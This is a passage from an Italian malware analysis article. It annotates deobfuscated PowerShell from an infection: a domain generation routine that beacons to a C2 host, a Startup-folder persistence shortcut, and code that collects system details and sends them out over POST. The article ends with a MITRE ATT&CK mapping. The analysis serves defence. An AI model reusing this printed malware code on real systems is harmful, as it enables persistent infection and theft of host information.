33   return $false;
34 };
```

Senza andare nei minimi dettagli, la funzione `sendpost2` si occupa di inviare delle richieste POST passando come argomento nel body della richiesta il valore di `$str_input`.
In caso di errori e di eccezioni, termina l'esecuzione di tutti i processi PowerShell e risponde al C2 con il relativo messaggio di errore.

> I dati che l'attaccante sta cercando di esfiltrare sono codificati in `Base64`

### Funzione: check_networking_availability

```powershell
 1 function check_networking_availability( $str_status ){
 2   # Funzione che probabilmente verifica se si riesce a raggiungere l'esterno
 3   $possibile_c2 = "http://cdn.danielrmurray.com/";
 4   # Creazione di domini potenzialmente fake per verificare il messaggio di risposta
 5   "hee","xu1","hs0","jd5","mqf" | %{ $possibile_c2 += ","+"http://"+ ( [Convert]::ToBase64String( [System.Text.Encoding]::UTF8.GetBytes( $_+ $(Get-Date -UFormat "%y%m%V") ) ).toLower() ) +".top/"; };
 6     # Gli URL contattati sono i seguenti (pre split)
 7     # Vedere la tabella sottostante
 8     
 9   $possibile_c2.split(",") | %{
10     if( !$myurlpost_bool ){
11       # Faccio una chiamata POST verso uno di quei URL ogni 5 secondi
12       $myurlpost_bool = $_;
13       # Se non ottengo risposta, metto a False il flag
14       if( !(sendpost2 ($str_status + "&domen=$myurlpost_bool" )) ){ $myurlpost_bool = $false; };
15       Start-Sleep -s 5;
16     }
17   };
18   # Se ho ricevuto risposta pari a 'status=register', potenzialmente la macchina si e' messa in comunicazione con il C2 e rimane in attesa di scaricare altri dati?
19   if( $str_status -match "status=register" ){
20     return "ok";
21   }else{
22     return $myurlpost_bool;
23   } 
24 };
```

La generazione dei domini viene fatta concatenando diversi prefissi con la data in questo particolare formato `%y%m%V`, convertito in minuscolo e aggiunto il suffisso `.top/` alla stringa precedentemente generata dopo averla convertita in `Base64`, ottenendo il seguente risultato:

| URLs | |
|-------------------------------------|------------------------------|
| hxxp[://]cdn[.]danielrmurray[.]com/ | hxxp[://]agvlmjmwnjiz[.]top/ |
| hxxp[://]ahmwmjmwnjiz[.]top/        | hxxp[://]amq1mjmwnjiz[.]top/ |
| hxxp[://]ehuxmjmwnjiz[.]top/        | hxxp[://]bxfmmjmwnjiz[.]top/ |

Ogni 5 secondi e per ogni URL generato (e successivamente estratto dalla concatenzaione tramite la funzione `split(',')`), eseguo una chiamata HTTP di tipo POST fin quando non ottengo la risposta `status=register` .

> Vengono utilizzati diversi URL come C2 per ridondanza. Semmai uno dei C2 dovesse essere messo offline, potenzialmente ci sono gli altri C2 in ascolto.
> 
> In questo specifico caso, gli URL generati (tranne il primo) non esistono e teoricamente l'obiettivo dell'attaccante è quello di capire se la macchina infetta si trova in un ambiente di analisi.
> Tale check può essere svolto richiedendo servizi inesistenti e verificando la risposta ottenuta e, se il malware dovesse ricevere una risposta da un sito web che non esiste, esso potrebbe interrompere la sua esecuzione ed eliminare qualsiasi traccia lasciata sul sistema.

### Funzione: startup_persistency

```powershell
 1 function startup_persistency( $zvhzcfz ){
 2   if( $zvhzcfz ){
 3     # Aggiungo al file DB un codice univoco generato al momento
 4     sc -Path $db_file -Value ( [guid]::NewGuid(), ( [guid]::NewGuid() -replace '-','' ).Substring(0,16)  -join ',' ) -Force;
 5     # Utilizzo di Get-Item -Force Hidden per aprire un file nascosto
 6     gi $db_file -Force |  %{ $_.Attributes = "Hidden" };
 7     try{
 8       $startup_path = [Environment]::GetFolderPath('Startup') + '\WindowsApplicationService.lnk';
 9       if( -not ( Test-Path $startup_path ) ){
10         # Creo l'oggetto WScript.Shell
11         $vuibgsb = New-Object -ComObject ('WScript.Shell');
12         $aefxstead = $vuibgsb.CreateShortcut( $startup_path  );
13         $aefxstead.TargetPath = $vbs_path;
14         $aefxstead.WorkingDirectory = $env_public_libraries_path;
15         $aefxstead.WindowStyle = 1;
16         $aefxstead.Description = 'Windows Application Service';
17         $aefxstead.Save();
18         # Creo file .lnk nella StartupFolder di Windows cosi che ad ogni riavvio, esegua il VBS malevolo
19       }
20     }catch{};
21     # Estraggo le informazioni dal file DB
22     $guid, $ssid = (get-content $db_file).split(',');
23     # Preparo la richiesta GET per fare l'OS fingerprint esfiltrando:
24     # - SSID della rete
25     # - Sistema operativo
26     # - PowerShell version
27     # - Computer name
28     $data_request = "status=register&ssid=$ssid&os="+([string]$PSVersionTable.BuildVersion)+"&psver="+( ( (Get-Host).Version ).Major )+ "&comp_name=" + ((Get-WmiObject -class Win32_ComputerSystem -Property Name).Name.trim() );
29     if( Test-Path ( $env_public_libraries_path + "\thumbcache_33.db" ) ){
30       # Se esiste il file DB, lo elimino insieme ad un file con estensione JS
31       ri -Path ( $env_public_libraries_path + "\thumbcache_33.db" ), ( $env_public_libraries_path + "\WindowsIndexingService.js" ) -Force;
32       # Rimuovo le persistenze. Probabilmente in caso non abbia più nulla da esfiltrare
33       try{ schtasks.exe /delete /TN "WindowsIndexingService" /f }catch{}
34       try{ schtasks.exe /delete /TN "Windows Indexing Service" /f }catch{}
35       if( Test-Path ( [Environment]::GetFolderPath('Startup') + '\WindowsIndexingService.lnk' )  ){
36         ri -Path ( [Environment]::GetFolderPath('Startup') + '\WindowsIndexingService.lnk' ) -Force;
37       }
38     }
39     $net_availability_response = check_networking_availability $data_request;
40     if( $net_availability_response -ne "ok"){
41       ri -Path $db_file -Force;
42       exit;
43     }
44   }
45   return (get-content $db_file).split(',');
46 }
```

Tale funzione si occupa solamente di creare una persistenza del malware sul filesystem infetto aggiungendo una nuova entry all'interno della `Startup` folder di Windows, in modo tale che ad ogni riavvio esso possa essere eseguito.

Vengono generati degli identificativi univoci e, insieme ad altri dati di sistema collezionati tramite il widget `Get-WmiObject`, vengono passati alla funzione che si occupa di fare le chiamate POST al C2 dell'attaccante.

Se la risposta da un qualsiasi C2 è pari a `status=register`, la funzione `check_network_availability` ritornerà la stringa `ok`, indicando allo script di rimuovere il file `db` e terminando l'esecuzione del programma.

# Matrice MITRE ATT&CK

| MITRE ATT&CK                                   |                                         |                                         |                                        |
|------------------------------------------------|-----------------------------------------|-----------------------------------------|----------------------------------------|
| T1059.001: PowerShell                          | T1564.001: Hidden Files and Directories | T1497.003: Time Based Evasion           | T1102.002: Bidirectional Communication |
| T1053.005: Scheduled Task                      | T1564.003: Hidden Window                | T1082: System Information Discovery     | T1041: Exfiltration Over C2 Channel    |
| T1047: Windows Management Instrumentation      | T1070.004: File Deletion                | T1071.001: Web Protocols                |                                        |
| T1547.001: Registry Run Keys / Startup Folder  | T1070.009: Clear Persistence            | T1132.001: Standard Encoding            |                                        |
| T1140: Deobfuscate/Decode Files or Information | T1036.004: Masquerade Task or Service   | T1568.002: Domain Generation Algorithms |                                        |
| T1480: Execution Guardrails                    | T1027.010: Command Obfuscation          | T1029: Scheduled Transfer               |                                        |

# Prossimi passi
Nell'articolo successivo, verrà analizzato il comportamento dello script in maniera dinamica e monitorando attentamente il traffico di rete e le chiamate di sistema di Windows in modo da tracciare e verificare se il comportamento rispecchia l'analisi appena svolta.

# Autore

L'articolo è stato scritto da Andrei "animoL" Moldovan.

[![Linkedin Badge](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/andrei-moldovan-cyber/)
[![Website Badge](https://img.shields.io/badge/website-000000?style=for-the-badge&logo=About.me&logoColor=white)](https://fortifox.com/)
